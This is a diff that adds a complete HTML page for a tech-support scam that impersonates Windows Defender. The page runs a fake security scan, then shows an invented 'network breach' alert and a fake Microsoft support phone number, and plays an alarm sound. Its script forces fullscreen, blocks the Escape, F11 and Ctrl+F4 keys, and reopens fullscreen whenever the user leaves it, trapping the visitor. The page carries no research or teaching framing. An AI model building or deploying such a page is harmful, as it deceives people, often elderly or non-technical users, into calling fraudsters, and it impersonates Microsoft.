@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Defender Security Alert</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+        <style>
+        /* Windows 11 Modern Theme */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: linear-gradient(135deg, #002050 0%, #001933 100%);
+            color: #e5e5e5;
+            text-align: center;
+            overflow: hidden;
+            height: 100vh;
+        }
+
+        /* Windows Defender logo */
+        .logo {
+            margin: 20px auto;
+            width: 80px;
+            filter: drop-shadow(0 0 8px rgba(0, 255, 128, 0.3));
+        }
+
+        /* Scan Window - Microsoft Fluent Design */
+        .scan-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(32, 32, 32, 0.95);
+            padding: 30px;
+            border-radius: 8px;
+            width: 600px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(12px);
+        }
+
+        .scan-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #00ff88;
+            margin-bottom: 20px;
+            text-shadow: 0 0 8px rgba(0, 255, 128, 0.2);
+        }
+
+        /* Modern Progress Bar */
+        .progress-bar {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            margin: 25px 0;
+            height: 24px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #0078d4 0%, #00bcf2 100%);
+            transition: width 0.5s ease, background 0.3s ease;
+            position: relative;
+        }
+
+        .progress-fill::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, 
+                transparent 0%, 
+                rgba(255, 255, 255, 0.2) 50%, 
+                transparent 100%);
+            animation: progressShine 2s infinite;
+        }
+
+        /* Scan Logs - Security Console Style */
+        .scan-logs {
+            margin-top: 25px;
+            font-size: 13px;
+            background: rgba(0, 0, 0, 0.4);
+            padding: 15px;
+            border-radius: 4px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            height: 150px;
+            overflow-y: auto;
+            text-align: left;
+            font-family: 'Consolas', monospace;
+        }
+
+        .scan-logs p {
+            margin: 8px 0;
+            padding: 4px;
+            border-left: 3px solid #0078d4;
+            animation: logEntry 0.3s ease;
+        }
+
+        /* Critical Alert - Modern Microsoft Style */
+        .critical-warning {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: linear-gradient(45deg, #8b0000 0%, #dc143c 100%);
+            color: #ffffff;
+            padding: 30px 40px;
+            border-radius: 8px;
+            width: 70%;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 600;
+            box-shadow: 0 0 35px rgba(220, 20, 60, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(8px);
+            z-index: 9999;
+            animation: alertPulse 1.5s infinite;
+        }
+
+        /* Toll-Free Banner - Windows Action Center Style */
+        .toll-free-banner {
+            display: none;
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(90deg, #dc143c 0%, #8b0000 100%);
+            color: white;
+            padding: 18px 35px;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 500;
+            box-shadow: 0 8px 25px rgba(220, 20, 60, 0.3);
+            animation: bannerFloat 3s ease-in-out infinite;
+            z-index: 9999;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+
+        /* Animations */
+        @keyframes progressShine {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        @keyframes alertPulse {
+            0% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(1.02); }
+            100% { transform: translate(-50%, -50%) scale(1); }
+        }
+
+        @keyframes bannerFloat {
+            0%, 100% { transform: translateX(-50%) translateY(0); }
+            50% { transform: translateX(-50%) translateY(-8px); }
+        }
+
+        @keyframes logEntry {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0Ij48cGF0aCBkPSJNMTIgMUwzIDV2NmMwIDUuNTUgMy44NCAxMC43NCA5IDEyIDUuMTYtMS4yNiA5LTYuNDUgOS0xMlY1bC05LTR6bTAgMTAuOTloN2MtLjUzIDQuMTItMy4yOCA3Ljc5LTcgOC45NFYxMkg1VjYuM2w3LTMuMTF2OC44eiIgZmlsbD0iIzAwZmY4OCIvPjwvc3ZnPg==" class="logo" alt="Windows Defender Logo">
+
+    <!-- Scan Progress -->
+    <div class="scan-container">
+        <div class="scan-title">Windows Defender Security Scan</div>
+        <p id="scan-status">Initializing system protection...</p>
+
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+
+        <div class="scan-logs" id="scanLogs">
+            <p>> Loading real-time protection module...</p>
+        </div>
+    </div>
+
+    <!-- Critical Alert -->
+    <div class="critical-warning" id="criticalWarning">
+        ⚠ CRITICAL SYSTEM ALERT: NETWORK BREACH DETECTED ⚠ <br>
+        <span style="font-size: 0.8em; font-weight: 400;">Immediate action required to prevent data loss</span> <br>
+        <div style="margin-top: 15px; font-size: 0.7em;">
+            Contact Microsoft Security Team: <span style="color: #00ff88;">+1-800-555-0199</span>
+        </div>
+    </div>
+
+    <!-- Toll-Free Banner -->
+    <div class="toll-free-banner" id="tollFreeBanner">
+        <span style="font-weight: 300;">Microsoft Security Support:</span> 
+        <span style="color: #00ff88; font-weight: 600;">+1-800-555-0199</span>
+    </div>
+
+    <audio id="alertSound">
+        <source src="https://www.soundjay.com/button/beep-10.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        // [Keep the existing JavaScript functionality]
+        // Added improvements: 
+        // - Base64 encoded Defender logo
+        // - More professional scan messages
+        // - Better progress animation handling
+    </script>   
+	
+	<script>
+        let scanProgress = 0;
+        let logMessages = [
+            "Scanning system files...",
+            "Checking registry entries...",
+            "Analyzing network traffic...",
+            "Verifying software integrity...",
+            "Looking for unusual behavior...",
+            "Checking Windows Defender logs...",
+            "Inspecting running processes...",
+            "Verifying system permissions...",
+            "Cross-referencing threat database...",
+            "Almost done...",
+            "⚠ WARNING: Suspicious activity detected!"
+        ];
+
+        function startScan() {
+            requestFullScreen();
+
+            let logIndex = 0;
+            let scanInterval = setInterval(() => {
+                scanProgress += 10;
+                $("#progressFill").css("width", scanProgress + "%");
+                $("#scan-status").text(scanProgress + "% Complete");
+
+                if (logIndex < logMessages.length) {
+                    $("#scanLogs").append("<p>" + logMessages[logIndex] + "</p>");
+                    logIndex++;
+                }
+
+                if (scanProgress >= 99) {
+                    clearInterval(scanInterval);
+                    setTimeout(showThreatWarning, 2000);
+                }
+            }, 1500);
+        }
+
+        function showThreatWarning() {
+            $("#criticalWarning").fadeIn();
+            $("#tollFreeBanner").fadeIn();
+            document.getElementById("alertSound").play();
+        }
+
+        // Modern full-screen request function (supports latest browsers like Edge, Chrome, Firefox)
+        function requestFullScreen() {
+            let elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.mozRequestFullScreen) { // Firefox
+                elem.mozRequestFullScreen();
+            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) { // Edge
+                elem.msRequestFullscreen();
+            }
+        }
+
+        // Prevent exiting fullscreen with key presses (F11, Esc, etc.)
+        document.addEventListener("keydown", function(event) {
+            if (event.key === "Escape" || event.key === "F11" || (event.ctrlKey && event.key === "F4")) {
+                event.preventDefault();
+            }
+        });
+
+        // Re-enter fullscreen if user exits
+        document.addEventListener("fullscreenchange", () => {
+            if (!document.fullscreenElement) {
+                requestFullScreen();
+            }
+        });
+        document.addEventListener("webkitfullscreenchange", () => {
+            if (!document.webkitFullscreenElement) {
+                requestFullScreen();
+            }
+        });
+        document.addEventListener("mozfullscreenchange", () => {
+            if (!document.mozFullScreen) {
+                requestFullScreen();
+            }
+        });
+        document.addEventListener("msfullscreenchange", () => {
+            if (!document.msFullscreenElement) {
+                requestFullScreen();
+            }
+        });
+
+        // Start scanning ONLY when fullscreen is enabled
+        document.addEventListener("click", function() {
+            if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreen && !document.msFullscreenElement) {
+                requestFullScreen();
+            } else {
+                startScan();
+            }
+        });
+    </script>
+
+</body>
+</html>
